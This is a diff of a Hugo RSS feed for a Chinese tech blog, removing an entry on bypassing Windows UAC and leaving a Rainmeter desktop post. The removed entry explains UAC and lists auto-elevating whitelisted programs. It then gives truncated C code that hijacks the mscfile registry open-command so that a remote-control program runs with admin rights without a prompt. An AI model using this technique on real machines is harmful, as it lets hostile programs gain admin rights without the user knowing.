@@ -6,28 +6,7 @@
     <description>Recent content in 技术 on XR_G&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Mon, 28 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://sgs4ever.github.io/categories/%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>提权技术--绕过UAC</title>
-      <link>https://sgs4ever.github.io/2020/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac/</link>
-      <pubDate>Mon, 28 Dec 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://sgs4ever.github.io/2020/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac/</guid>
-      <description>最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。
-话不多说，总结本次的提权办法——绕过UAC。
- 1. UAC   UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。
-然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。
-当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。
-如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。
-不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。
-  2. 绕过UAC   根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：
- 该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。  对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。
- 2.1 基于白名单的Bypass　UAC   有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。
-针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。
-我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：
-#include &amp;lt;Windows.h&amp;gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项  ::RegCreateKeyEx(HKEY_CURRENT_USER, &amp;#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&amp;#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;amp;hKey, NULL); // 设置键值  ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath))); // 关闭注册表  ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位  ::Wow64DisableWow64FsRedirection(&amp;amp;OldValue); // 修改注册表，设置我们的程序为启动目标  bRet = SetReg(&amp;#34;F:\\RemoteCtrl_Win10.</description>
-    </item>
-    
+    <lastBuildDate>Mon, 21 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://sgs4ever.github.io/categories/%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>桌面美化方案-Rainmeter</title>
       <link>https://sgs4ever.github.io/2020/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/</link>
